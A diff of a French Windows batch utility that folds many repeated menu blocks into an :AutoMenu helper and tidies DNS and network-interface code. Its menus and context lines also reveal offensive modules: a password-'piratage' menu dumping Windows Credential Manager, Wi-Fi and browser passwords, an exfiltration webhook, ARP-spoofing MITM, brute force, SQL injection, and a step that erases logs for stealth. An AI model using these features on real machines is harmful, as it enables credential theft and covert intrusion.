@@ -151,9 +151,30 @@ set "t[144]=cyber_lan_scan:LAN SCAN~Scan turbo (Marques/Ports/BruteForce):HIDDEN
 set "t[145]=cyber_flux_analysis:FLUX Reseau~Analyse des ports et processus locaux:HIDDEN"
 set "t[146]=cyber_dns_leak:DNS LEAK~Verifier la fuite DNS (VPN):HIDDEN"
 set "t[147]=cyber_ip_grabber:IP GRABBER~Obtenir l'IP d'une box distante:HIDDEN"
-set "total_tools=147"
-
-
+REM --- SOUS-OUTILS DU MENU DIAGNOSTIC ---
+set "t[148]=sys_report:Rapport Systeme~CPU, RAM, GPU, Stockage, Reseau:HIDDEN"
+set "t[149]=sys_temp_report:Rapport de Temperature~Capteurs CPU et GPU:HIDDEN"
+set "t[150]=sys_ram_check:Test de Memoire RAM~Analyse des barrettes:HIDDEN"
+set "t[151]=sys_diag_network:Diagnostic Reseau~Ping, tracert, ports:HIDDEN"
+set "t[152]=sys_battery_report:Rapport Batterie~Usure et autonomie:HIDDEN"
+set "t[153]=sys_bitlocker_check:Etat BitLocker~Chiffrement des disques:HIDDEN"
+set "t[154]=sys_event_log:Journal des Erreurs~Evenements critiques Windows:HIDDEN"
+set "t[155]=sys_hw_test:Test Materiel~Processeur et memoire stress test:HIDDEN"
+set "t[156]=sys_defender:Etat Windows Defender~Antivirus et protection:HIDDEN"
+REM --- SOUS-OUTILS DU MENU RESCUE ---
+set "t[157]=res_sfc:SFC Scannow~Reparation des fichiers systeme:HIDDEN"
+set "t[158]=res_dism_check:DISM CheckHealth~Verifier l'integrite de l'image:HIDDEN"
+set "t[159]=res_dism_restore:DISM RestoreHealth~Restaurer l'image systeme:HIDDEN"
+set "t[160]=res_temp_clean:Nettoyage temp et SoftwareDistribution~Liberer de l'espace:HIDDEN"
+set "t[161]=res_chkdsk:CHKDSK~Reparer les erreurs disque:HIDDEN"
+set "t[162]=res_wu_reset:Reset Windows Update~Reinitialiser les services MAJ:HIDDEN"
+set "t[163]=res_explorer_restart:Redemarrer l'Explorateur~Sans redemarrer le PC:HIDDEN"
+set "t[164]=res_gpu_reset:Reinitialiser le GPU~Win+Ctrl+Shift+B:HIDDEN"
+REM --- SOUS-OUTILS DU MENU MOT DE PASSE ---
+set "t[165]=dump_credman:Credential Manager~Extraire les identifiants Windows:HIDDEN"
+set "t[166]=dump_wifi:Mots de passe Wi-Fi~Afficher ou exporter les SSID:HIDDEN"
+set "t[167]=sys_nirsoft_pw:Extracteur Navigateurs (Nirsoft)~Chrome, Edge, Firefox:HIDDEN"
+set "total_tools=167"
 
 if not exist "%SCRIPT_DIR%\favoris.txt" type nul > "%SCRIPT_DIR%\favoris.txt"
 
@@ -211,32 +232,14 @@ set "target=!main_target[%main_choice%]!"
 if defined target if not "!target!"=="none" goto !target!
 goto menu_principal
 
-
 REM ===================================================================
 REM                    GESTIONNAIRE DNS CLOUDFLARE
 REM ===================================================================
 :dns_manager
-cls
-set "dns_labels=show_dns_config;---;install_cloudflare_full;---;install_google_full;---;restore_dns"
-set "dns_titles=Affichage de la configuration actuelle~Voir IP des DNS en cours;[--- CLOUDFLARE ---];DNS Cloudflare (1.1.1.1)~Rapide et Securise;[--- GOOGLE ---];DNS Google (8.8.8.8)~Le plus populaire;[--- REINITIALISATION ---];Restauration des DNS par defaut (DHCP)~Remettre a zero"
+call :AutoMenu "GESTIONNAIRE DNS" "show_dns_config;[--- CLOUDFLARE ---];install_cloudflare_full;[--- GOOGLE ---];install_google_full;[--- REINITIALISATION ---];restore_dns"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
-call :BuildFavMenu "!dns_labels!" "!dns_titles!"
-call :DynamicMenu "GESTIONNAIRE DNS" "!FAV_BUILT_OPTS!"
-set "dns_choice=%errorlevel%"
-
-if "%dns_choice%"=="0" goto system_tools
-if %dns_choice% GEQ 200 (
-    set /a "t_idx=%dns_choice%-200"
-    call :_bfm_get_token "!dns_labels!" !t_idx! d_target
-    if "!d_target!" NEQ "---" call :ToggleFav "!d_target!"
-    goto dns_manager
-)
-
-if "%dns_choice%"=="1" goto show_dns_config
-if "%dns_choice%"=="2" goto install_cloudflare_full
-if "%dns_choice%"=="3" goto install_google_full
-if "%dns_choice%"=="4" goto restore_dns
-goto dns_manager
 :install_cloudflare_full
 cls
 echo ================================================
@@ -261,16 +264,16 @@ netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4
 echo Sauvegarde creee dans dns_backups
 echo.
 
-echo Configuration des DNS Cloudflare IPv4...
-netsh interface ip set dns "%interface%" static 1.1.1.1
-netsh interface ip add dns "%interface%" 1.0.0.1 index=2
-
-echo Configuration des DNS Cloudflare IPv6...
-netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111
-netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2
+echo Configuration des DNS Cloudflare IPv4 et IPv6...
+net stop Dnscache /y >nul 2>&1
+netsh interface ip set dns "%interface%" static 1.1.1.1 >nul 2>&1
+netsh interface ip add dns "%interface%" 1.0.0.1 index=2 >nul 2>&1
+netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111 >nul 2>&1
+netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2 >nul 2>&1
+net start Dnscache >nul 2>&1
 
 echo Vidage du cache DNS...
-ipconfig /flushdns
+ipconfig /flushdns >nul
 
 echo.
 echo ================================================
@@ -285,7 +288,6 @@ echo   IPv6 - Secondaire: 2606:4700:4700::1001
 echo.
 pause
 goto dns_manager
-
 
 :install_google_full
 cls
@@ -311,13 +313,13 @@ netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4
 echo Sauvegarde creee dans dns_backups
 echo.
 
-echo Configuration des DNS Google IPv4...
+echo Configuration des DNS Google IPv4 et IPv6...
+net stop Dnscache /y >nul 2>&1
 netsh interface ip set dns "%interface%" static 8.8.8.8 >nul 2>&1
 netsh interface ip add dns "%interface%" 8.8.4.4 index=2 >nul 2>&1
-
-echo Configuration des DNS Google IPv6...
 netsh interface ipv6 set dns "%interface%" static 2001:4860:4860::8888 >nul 2>&1
 netsh interface ipv6 add dns "%interface%" 2001:4860:4860::8844 index=2 >nul 2>&1
+net start Dnscache >nul 2>&1
 
 echo Vidage du cache DNS...
 ipconfig /flushdns >nul
@@ -336,7 +338,6 @@ echo.
 pause
 goto dns_manager
 
-
 :restore_dns
 cls
 echo ================================================
@@ -354,14 +355,14 @@ if "%interface%"=="" (
 echo Interface reseau detectee: %interface%
 echo.
 
-echo Restauration des DNS automatiques IPv4...
-netsh interface ip set dns "%interface%" dhcp
-
-echo Restauration des DNS automatiques IPv6...
-netsh interface ipv6 set dns "%interface%" dhcp
+echo Restauration des DNS automatiques (IPv4 et IPv6)...
+net stop Dnscache /y >nul 2>&1
+netsh interface ip set dns "%interface%" dhcp >nul 2>&1
+netsh interface ipv6 set dns "%interface%" dhcp >nul 2>&1
+net start Dnscache >nul 2>&1
 
 echo Vidage du cache DNS...
-ipconfig /flushdns
+ipconfig /flushdns >nul
 
 echo.
 echo ================================================
@@ -398,31 +399,21 @@ goto dns_manager
 
 :get_interface
 set "interface="
+REM --- Priorite PowerShell (plus fiable que netsh) ---
+for /f "usebackq delims=" %%I in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.Virtual -eq $false } | Sort-Object -Property LinkSpeed -Descending | Select-Object -First 1 -ExpandProperty Name"`) do (
+    set "interface=%%I"
+)
+if defined interface goto :interface_found
+REM --- Fallback via netsh ---
 for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
-    if /i "%%b"=="Connecté" (
-        set "interface=%%d"
-        goto :interface_found
-    )
-    if /i "%%b"=="Connected" (
-        set "interface=%%d"
-        goto :interface_found
-    )
+    if /i "%%b"=="Connecté" ( set "interface=%%d" & goto :interface_found )
+    if /i "%%b"=="Connected" ( set "interface=%%d" & goto :interface_found )
 )
 for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
-    if /i "%%c"=="Dédié" (
-        set "interface=%%d"
-        goto :interface_found
-    )
-    if /i "%%c"=="Dedicated" (
-        set "interface=%%d"
-        goto :interface_found
-    )
+    if /i "%%c"=="Dédié" ( set "interface=%%d" & goto :interface_found )
+    if /i "%%c"=="Dedicated" ( set "interface=%%d" & goto :interface_found )
 )
 :interface_found
-if defined interface (
-    set "interface=%interface: =%"
-    set "interface=%interface:"=%"
-)
 goto :eof
 
 REM ===================================================================
@@ -845,8 +836,6 @@ if defined search_lbl (
 )
 goto menu_principal
 
-
-
 REM ===================================================================
 REM              INSTALLATEUR D'APPLICATIONS (WINGET)
 REM ===================================================================
@@ -936,26 +925,9 @@ goto app_installer
 :: Menu d'extraction de mots de passe
 :: ===============================================
 :sys_passwords_menu
-set "pw_labels=dump_credman;dump_wifi;sys_nirsoft_pw"
-set "pw_titles=Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump);Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms;WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"
-
-call :BuildFavMenu "!pw_labels!" "!pw_titles!"
-call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "!FAV_BUILT_OPTS!" "NONUMS"
-set "pw_choice=%errorlevel%"
-
-if "!pw_choice!"=="0" goto system_tools
-
-if !pw_choice! GEQ 200 (
-    set /a "t_idx=!pw_choice!-200"
-    call :_bfm_get_token "!pw_labels!" !t_idx! pw_target
-    if "!pw_target!" NEQ "---" call :ToggleFav "!pw_target!"
-    goto sys_passwords_menu
-)
-
-if "!pw_choice!"=="1" goto dump_credman
-if "!pw_choice!"=="2" goto dump_wifi
-if "!pw_choice!"=="3" goto sys_nirsoft_pw
-goto sys_passwords_menu
+call :AutoMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "dump_credman;dump_wifi;sys_nirsoft_pw" "NONUMS"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :dump_credman
 cls
@@ -1165,53 +1137,9 @@ endlocal
 goto system_tools
 
 :sys_rescue_menu
-set "opts=Creer un Point de Restauration~RECOMMANDE : Sauvegarde l'etat du systeme avant toute reparation"
-set "opts=%opts%;Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS"
-set "opts=%opts%;Verification image base~Examine rapidement l'integration (DISM /CheckHealth)"
-set "opts=%opts%;Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)"
-set "opts=%opts%;Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace"
-set "opts=%opts%;Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot"
-set "opts=%opts%;Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu"
-
-:: Mapping des targets pour gestion des favoris en sous-menu
-set "res_t[1]=res_restore_point"
-set "res_t[2]=res_sfc"
-set "res_t[3]=res_dism_check"
-set "res_t[4]=res_dism_restore"
-set "res_t[5]=res_temp_clean"
-set "res_t[6]=res_chkdsk"
-set "res_t[7]=res_wu_reset"
-set "res_t[8]=res_explorer_restart"
-set "res_t[9]=res_gpu_reset"
-
-:: Utilisation du nouveau moteur DRY :BuildFavMenu
-set "res_labels=res_restore_point;res_sfc;res_dism_check;res_dism_restore;res_temp_clean;res_chkdsk;res_wu_reset;res_explorer_restart;res_gpu_reset"
-set "res_titles=Creer un Point de Restauration~RECOMMANDE : Sauvegarde l'etat du systeme avant toute reparation;Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS;Verification image base~Examine rapidement l'integration (DISM /CheckHealth);Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth);Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace;Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot;Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu;Redemarrer l'Explorateur Windows~Corrige les freezes visuels sans redemarrer le PC;Reinitialiser le pilote GPU~Envoie le signal Win+Ctrl+Shift+B pour relancer l'affichage"
-
-call :BuildFavMenu "!res_labels!" "!res_titles!"
-set "res_opts=!FAV_BUILT_OPTS!"
-
-call :DynamicMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "!res_opts!"
-set "reschoice=%errorlevel%"
-
-if "%reschoice%"=="0" goto system_tools
-
-if %reschoice% GEQ 200 (
-    set /a t_idx=%reschoice%-200
-    call :ToggleFav "!res_t[%t_idx%]!"
-    goto sys_rescue_menu
-)
-
-if "%reschoice%"=="1" goto res_restore_point
-if "%reschoice%"=="2" goto res_sfc
-if "%reschoice%"=="3" goto res_dism_check
-if "%reschoice%"=="4" goto res_dism_restore
-if "%reschoice%"=="5" goto res_temp_clean
-if "%reschoice%"=="6" goto res_chkdsk
-if "%reschoice%"=="7" goto res_wu_reset
-if "%reschoice%"=="8" goto res_explorer_restart
-if "%reschoice%"=="9" goto res_gpu_reset
-goto sys_rescue_menu
+call :AutoMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "res_restore_point;res_sfc;res_dism_check;res_dism_restore;res_temp_clean;res_chkdsk;res_wu_reset;res_explorer_restart;res_gpu_reset"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :res_sfc
 cls
@@ -1303,33 +1231,10 @@ pause
 goto sys_rescue_menu
 
 :sys_network_menu
-cls
-set "net_labels=net_flush_dns;net_display_dns;net_clear_arp;net_display_arp;net_renew_ip;net_reset_tcpip;net_reset_winsock;net_reset_all;net_restart_adapters;net_fast_reset"
-set "net_titles=Vider le cache DNS~Supprime et reinitialise le cache du resolveur (ipconfig /flushdns);Afficher le cache DNS~Liste toutes les entrees DNS stockees en memoire locale (ipconfig /displaydns);Vider le cache ARP~Nettoie instantanement la table de correspondance des IP/MAC (arp -d *);Afficher la table ARP~Affiche les appareils de votre reseau recemment contactes (arp -a);Liberer et Renouveler l'IP~Demande une nouvelle adresse IP au serveur DHCP / Box (release / renew);Reset TCP/IP Stack IPv4/IPv6~Repare la pile reseau vitale de Windows (netsh int ip reset);Reset des Sockets Windows~Reinitialise le catalogue Winsock corrompu (netsh winsock reset);Reset Reseau Automatique~Enchaine silencieusement le Flush DNS, Winsock, et TCP/IP;Redemarrer les cartes reseau~Vos pilotes Ethernet et Wi-Fi sont mis hors puis sous tension;Executer le Script d'Urgence~Sequence immediate de 7 commandes de depannage massif (Fast Reset)"
+call :AutoMenu "MENU DE DEPANNAGE RESEAU" "net_flush_dns;net_display_dns;net_clear_arp;net_display_arp;net_renew_ip;net_reset_tcpip;net_reset_winsock;net_reset_all;net_restart_adapters;net_fast_reset"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
-call :BuildFavMenu "!net_labels!" "!net_titles!"
-call :DynamicMenu "MENU DE DEPANNAGE RESEAU" "!FAV_BUILT_OPTS!"
-set "net_choice=%errorlevel%"
-
-if "%net_choice%"=="0" goto system_tools
-if %net_choice% GEQ 200 (
-    set /a "t_idx=%net_choice%-200"
-    call :_bfm_get_token "!net_labels!" !t_idx! n_target
-    if "!n_target!" NEQ "---" call :ToggleFav "!n_target!"
-    goto sys_network_menu
-)
-
-if "%net_choice%"=="1" goto net_flush_dns
-if "%net_choice%"=="2" goto net_display_dns
-if "%net_choice%"=="3" goto net_clear_arp
-if "%net_choice%"=="4" goto net_display_arp
-if "%net_choice%"=="5" goto net_renew_ip
-if "%net_choice%"=="6" goto net_reset_tcpip
-if "%net_choice%"=="7" goto net_reset_winsock
-if "%net_choice%"=="8" goto net_reset_all
-if "%net_choice%"=="9" goto net_restart_adapters
-if "%net_choice%"=="10" goto net_fast_reset
-goto sys_network_menu
 :net_flush_dns
 cls
 echo Vidage du cache DNS...
@@ -1438,30 +1343,10 @@ REM ===================================================================
 REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 :net_cyber_menu
-cls
-set "cyb_labels=cyber_triage;cyber_adapter_audit;cyber_lan_scan;cyber_flux_analysis;cyber_dns_leak;cyber_wifi_audit;cyber_ip_grabber"
-set "cyb_titles=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);AUDIT Wi-Fi;IP GRABBER - Obtenir l'IP d'une box distante (Ecoute directe)"
+call :AutoMenu "CYBERSECURITE RESEAU" "cyber_triage;cyber_adapter_audit;cyber_lan_scan;cyber_flux_analysis;cyber_dns_leak;cyber_wifi_audit;cyber_ip_grabber" "NONUMS"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
-call :BuildFavMenu "!cyb_labels!" "!cyb_titles!"
-call :DynamicMenu "CYBERSECURITE RESEAU" "!FAV_BUILT_OPTS!" "NONUMS"
-set "cyber_choice=%errorlevel%"
-
-if "%cyber_choice%"=="0" goto system_tools
-if %cyber_choice% GEQ 200 (
-    set /a "t_idx=%cyber_choice%-200"
-    call :_bfm_get_token "!cyb_labels!" !t_idx! c_target
-    if "!c_target!" NEQ "---" call :ToggleFav "!c_target!"
-    goto net_cyber_menu
-)
-
-if "%cyber_choice%"=="1" goto cyber_triage
-if "%cyber_choice%"=="2" goto cyber_adapter_audit
-if "%cyber_choice%"=="3" goto cyber_lan_scan
-if "%cyber_choice%"=="4" goto cyber_flux_analysis
-if "%cyber_choice%"=="5" goto cyber_dns_leak
-if "%cyber_choice%"=="6" goto cyber_wifi_audit
-if "%cyber_choice%"=="7" goto cyber_ip_grabber
-goto net_cyber_menu
 :cyber_ip_grabber
 cls
 echo.
@@ -1613,7 +1498,6 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB%"
 if exist "%PS_GRAB%" del "%PS_GRAB%"
 pause >nul
 goto net_cyber_menu
-
 
 :cyber_triage
 cls
@@ -2001,8 +1885,6 @@ echo.
 pause
 goto net_cyber_menu
 
-
-
 :cyber_privesc_audit
 cls
 echo.
@@ -2110,7 +1992,6 @@ REM ===================================================================
 REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 
-
 :cyber_lan_scan
 cls
 echo.
@@ -2176,7 +2057,6 @@ call :InputWithEsc "Port (Optionnel) : " remote_port
 if errorlevel 1 goto cyber_lan_scan
 if not defined remote_port set "remote_port=NONE"
 goto cyber_remote_menu
-
 
 :cyber_remote_menu
 set "remote_info_title=ACTIONS DISTANTES - [ !remote_ip! ]"
@@ -2446,7 +2326,6 @@ if "%smb_sel%"=="9" goto cyber_exfiltrate_webhook
 if "%smb_sel%"=="10" goto cyber_exposure_audit
 goto net_cyber_menu
 
-
 REM ===================================================================
 REM       NOUVEAU MODULE : INTERCEPTION MITM (ARP SPOOFING)
 REM ===================================================================
@@ -2528,7 +2407,6 @@ echo.
 echo [i] Conseil : Utilise 'Python -m http.server 80' pour tester.
 pause & goto cyber_mitm_module
 
-
 REM --- FONCTIONS DE NETTOYAGE ET DUMPING AMELIOREES ---
 :smb_dump_action
 cls
@@ -2553,9 +2431,6 @@ if %errorlevel% neq 0 (
 )
 echo [OK] Logs effaces. Furtivite assuree.
 pause ^& goto smb_exp_menu
-
-
-
 
 :lan_all_deep
 cls
@@ -2586,7 +2461,6 @@ if not exist "%BRUTE_FILE%" (
 
 echo [i] Succes enregistres dans : penetration_success.log
 echo.
-
 
 set "SCDP=%TEMP%\aggressive_audit.ps1"
 >  "%SCDP%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
@@ -2716,7 +2590,6 @@ if /i "%save_choice%"=="O" (
 pause
 goto net_cyber_menu
 
-
 :cyber_exposed_files
 cls
 echo.
@@ -2817,7 +2690,6 @@ if exist "%EFS%" del "%EFS%"
 echo.
 pause
 goto net_cyber_menu
-
 
 :cyber_sqli_blind
 cls
@@ -3144,7 +3016,6 @@ echo.
 pause
 goto net_cyber_menu
 
-
 :cyber_subdomain_scan
 cls
 echo.
@@ -3255,7 +3126,6 @@ if exist "%SSS%" del "%SSS%"
 echo.
 pause
 goto net_cyber_menu
-
 
 :cyber_auth_test
 cls
@@ -4014,7 +3884,6 @@ echo.
 pause
 goto net_cyber_menu
 
-
 :cyber_security_report
 cls
 echo.
@@ -4226,7 +4095,6 @@ echo.
 pause
 goto net_cyber_menu
 
-
 :cyber_lfi_scan
 cls
 echo.
@@ -4324,7 +4192,6 @@ echo.
 pause
 goto net_cyber_menu
 
-
 REM ===================================================================
 REM         EXPORT JSON UNIFIE DES FINDINGS
 REM ===================================================================
@@ -4420,7 +4287,6 @@ if exist "%EJ_PS%" del /f /q "%EJ_PS%"
 echo.
 pause
 goto net_cyber_menu
-
 
 REM ===================================================================
 REM         OPEN REDIRECT - Detection avancee
@@ -4887,45 +4753,9 @@ pause
 goto sys_export_menu
 
 :sys_diagnostic_menu
-cls
-set "opts=[--- ANALYSE SYSTEME ET RAPPORTS ---]"
-set "opts=%opts%;Apercu de la configuration PC~Affiche les specifications et l'etat de sante materiel"
-set "opts=%opts%;Rapport de temperature CPU/GPU~Affiche les temperatures en temps reel"
-set "opts=%opts%;Verificateur de RAM~Slots utilises vs max supporte"
-set "opts=%opts%;Diagnostic Reseau~Test de connexion (Local, Box, Internet, DNS)"
-set "opts=%opts%;Rapport de Batterie~Usure, Sante et stats en temps reel"
-set "opts=%opts%;Verificateur BitLocker~Verifiez l'etat de chiffrement de vos partitions"
-set "opts=%opts%;Journaux d'Erreurs Windows~Affiche les erreurs critiques recentes (24h / 7 jours)"
-set "opts=%opts%;Test des Composants PC~Benchmark disque, RAM, CPU et SMART en un clic"
-set "opts=%opts%;Gestionnaire Windows Defender~Scan rapide/complet CLI, MAJ signatures, menaces detectees"
-
-call :DynamicMenu "MENU DE DIAGNOSTIC SYSTEME" "%opts%"
-set "diag_choice=%errorlevel%"
-
-if "%diag_choice%"=="1" goto sys_report
-if "%diag_choice%"=="2" goto sys_temp_report
-if "%diag_choice%"=="3" goto sys_ram_check
-if "%diag_choice%"=="4" goto sys_diag_network
-if "%diag_choice%"=="5" goto sys_battery_report
-if "%diag_choice%"=="6" goto sys_bitlocker_check
-if "%diag_choice%"=="7" goto sys_event_log
-if "%diag_choice%"=="8" goto sys_hw_test
-if "%diag_choice%"=="9" goto sys_defender
-if "%diag_choice%"=="0" goto system_tools
-
-if %diag_choice% GEQ 200 (
-    set /a "toggle_idx=%diag_choice%-200"
-    if "!toggle_idx!"=="1" call :ToggleFav "sys_report"
-    if "!toggle_idx!"=="2" call :ToggleFav "sys_temp_report"
-    if "!toggle_idx!"=="3" call :ToggleFav "sys_ram_check"
-    if "!toggle_idx!"=="4" call :ToggleFav "sys_diag_network"
-    if "!toggle_idx!"=="5" call :ToggleFav "sys_battery_report"
-    if "!toggle_idx!"=="6" call :ToggleFav "sys_bitlocker_check"
-    if "!toggle_idx!"=="7" call :ToggleFav "sys_event_log"
-    if "!toggle_idx!"=="8" call :ToggleFav "sys_hw_test"
-    if "!toggle_idx!"=="9" call :ToggleFav "sys_defender"
-)
-goto sys_diagnostic_menu
+call :AutoMenu "MENU DE DIAGNOSTIC SYSTEME" "[--- ANALYSE SYSTEME ET RAPPORTS ---];sys_report;sys_temp_report;sys_ram_check;sys_diag_network;sys_battery_report;sys_bitlocker_check;sys_event_log;sys_hw_test;sys_defender"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :sys_report
 cls
@@ -4961,31 +4791,9 @@ REM ===================================================================
 REM              MENU DES EXTRACTIONS ET SAUVEGARDES
 REM ===================================================================
 :sys_export_menu
-cls
-set "opts=[--- INFORMATIONS ET CLES ---]"
-set "opts=%opts%;Cle Windows et Office~Affiche ou recupere vos differentes cles de produit"
-set "opts=%opts%;Extraction des pilotes~Exporte la liste de tous les pilotes natifs installes"
-set "opts=%opts%;[--- LISTES DE LOGICIELS ET RESEAUX ---]"
-set "opts=%opts%;Export Liste des Logiciels~Exporte tous les programmes installes en fichier texte ou tableur"
-set "opts=%opts%;[BUREAU] Export Wi-Fi + Logiciels~Genere directement 2 fichiers TXT sur le Bureau (Rapide)"
-
-call :DynamicMenu "MENU EXTRACTION ET SAUVEGARDE" "%opts%"
-set "exp_choice=%errorlevel%"
-
-if "%exp_choice%"=="1" goto sys_win_key
-if "%exp_choice%"=="2" goto sys_drivers
-if "%exp_choice%"=="3" goto sys_export_software
-if "%exp_choice%"=="4" goto sys_export_wifi_apps
-if "%exp_choice%"=="0" goto system_tools
-
-if %exp_choice% GEQ 200 (
-    set /a "toggle_idx=%exp_choice%-200"
-    if "!toggle_idx!"=="1" call :ToggleFav "sys_win_key"
-    if "!toggle_idx!"=="2" call :ToggleFav "sys_drivers"
-    if "!toggle_idx!"=="3" call :ToggleFav "sys_export_software"
-    if "!toggle_idx!"=="4" call :ToggleFav "sys_export_wifi_apps"
-)
-goto sys_export_menu
+call :AutoMenu "MENU EXTRACTION ET SAUVEGARDE" "[--- INFORMATIONS ET CLES ---];sys_win_key;sys_drivers;[--- LISTES DE LOGICIELS ET RESEAUX ---];sys_export_software;sys_export_wifi_apps"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :sys_win_key
 set "opts=Cle Windows OEM (Incrustee au BIOS);Cle Windows Actuelle (Installee);Cle Produit Office (via CMD)"
@@ -5231,7 +5039,6 @@ if "%OP%"=="1" (
 pause
 goto um_menu
 
-
 :um_add
 cls
 call :um_show_active
@@ -5341,7 +5148,6 @@ if exist "C:\Users\%DELU%" (
 pause
 goto um_menu
 
-
 :um_reset
 cls
 set "user_opts="
@@ -5432,7 +5238,6 @@ if %errorlevel%==0 (
 )
 pause
 goto um_menu
-
 
 :um_show_active
 echo.
@@ -5639,18 +5444,9 @@ REM ===================================================================
 REM              TEST DES COMPOSANTS PC (BENCHMARK)
 REM ===================================================================
 :sys_hw_test
-cls
-set "opts=Test SMART + Sante Disque~Verifie l'etat de sante SMART de tous les disques;Test de performance disque (WinSAT)~Score de vitesse lecture/ecriture du disque systeme;Test RAM (Windows Memory Diagnostic)~Lance le test memoire au prochain redemarrage;Rapport complet Composants~CPU, RAM, GPU, Disques - Resume technique;Tout tester en sequence~Lance tous les tests disponibles"
-call :DynamicMenu "TEST DES COMPOSANTS PC" "%opts%"
-set "hw_choice=%errorlevel%"
-
-if "%hw_choice%"=="1" goto hw_smart
-if "%hw_choice%"=="2" goto hw_winsat
-if "%hw_choice%"=="3" goto hw_ram_test
-if "%hw_choice%"=="4" goto hw_full_report
-if "%hw_choice%"=="5" goto hw_all
-if "%hw_choice%"=="0" goto system_tools
-goto sys_hw_test
+call :AutoMenu "TEST DES COMPOSANTS PC" "hw_smart;hw_winsat;hw_ram_test;hw_full_report;hw_all"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :hw_smart
 cls
@@ -5768,17 +5564,9 @@ REM ===================================================================
 REM              JOURNAUX D'ERREURS WINDOWS FILTRES
 REM ===================================================================
 :sys_event_log
-cls
-set "opts=Erreurs critiques (24 dernieres heures)~Affiche les crashes et erreurs graves du jour;Erreurs critiques (7 derniers jours)~Vue hebdomadaire des problemes systeme;Erreurs application (24h)~Logiciels plantes ou en erreur aujourd'hui;Avertissements disque / stockage~Detecte les signes de defaillance materielle"
-call :DynamicMenu "JOURNAUX D'ERREURS WINDOWS" "%opts%"
-set "ev_choice=%errorlevel%"
-
-if "%ev_choice%"=="0" goto system_tools
-if "%ev_choice%"=="1" goto ev_critical_24h
-if "%ev_choice%"=="2" goto ev_critical_7d
-if "%ev_choice%"=="3" goto ev_app_24h
-if "%ev_choice%"=="4" goto ev_disk_warn
-goto sys_event_log
+call :AutoMenu "JOURNAUX D'ERREURS WINDOWS" "ev_critical_24h;ev_critical_7d;ev_app_24h;ev_disk_warn"
+if "%errorlevel%"=="0" goto system_tools
+goto !AutoMenu_Target!
 
 :ev_critical_24h
 cls
@@ -5827,22 +5615,9 @@ REM ===================================================================
 REM              MODE REPARATION ET DEMARRAGE WINDOWS
 REM ===================================================================
 :sys_winre
-cls
-set "opts=WinRE - Reparation directe~Boot dans l environnement de recuperation Windows (outil reagentc);BIOS / UEFI~Acces direct aux parametres firmware de la carte mere;Menu de demarrage (Boot Menu)~Selectionner le peripherique de demarrage (cle USB, disque...);Mode sans echec - Minimal~Demarrer sans pilotes tiers - le plus stable;Mode sans echec - Avec Reseau~Sans pilotes tiers + acces internet;Mode sans echec - Invite CMD~Safe Mode avec ligne de commande a la place de l Explorer;Desactiver signature pilotes~Installer des pilotes non signes (1 demarrage seulement);Verifier statut WinRE~Affiche l etat de l environnement de recuperation + flags bcdedit;Reinitialiser les parametres de demarrage~Supprimer tous les flags bcdedit appliques"
-call :DynamicMenu "MODE DEMARRAGE / REPARATION WINDOWS" "%opts%"
-set "wr_choice=%errorlevel%"
-
-if "%wr_choice%"=="0" goto system_tools
-if "%wr_choice%"=="1" goto winre_boot
-if "%wr_choice%"=="2" goto winre_bios
-if "%wr_choice%"=="3" goto winre_bootmenu
-if "%wr_choice%"=="4" goto winre_safe_minimal
-if "%wr_choice%"=="5" goto winre_safe_network
-if "%wr_choice%"=="6" goto winre_safe_cmd
-if "%wr_choice%"=="7" goto winre_nosign
-if "%wr_choice%"=="8" goto winre_status
-if "%wr_choice%"=="9" goto winre_reset
-goto sys_winre
+call :AutoMenu "MODE DEMARRAGE / REPARATION WINDOWS" "winre_boot;winre_bios;winre_bootmenu;winre_safe_minimal;winre_safe_network;winre_safe_cmd;winre_nosign;winre_status;winre_reset"
+if "%errorlevel%"=="0" goto system_tools
